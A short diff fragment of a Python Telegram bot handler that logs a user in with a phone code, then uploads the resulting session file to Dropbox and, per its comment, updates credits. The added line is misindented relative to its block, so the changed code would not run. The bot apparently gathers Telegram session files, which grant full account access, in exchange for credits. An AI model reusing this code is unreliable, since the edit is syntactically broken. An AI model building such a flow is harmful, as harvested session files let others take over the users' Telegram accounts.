@@ -127,7 +127,8 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ Logged in successfully!")
 
         # Upload session file and update credits
-        await upload_session_to_dropbox(client, phone, user_id)
+      await upload_session_to_dropbox(client, phone, update)
+
 
         await client.disconnect()
         return ConversationHandler.END
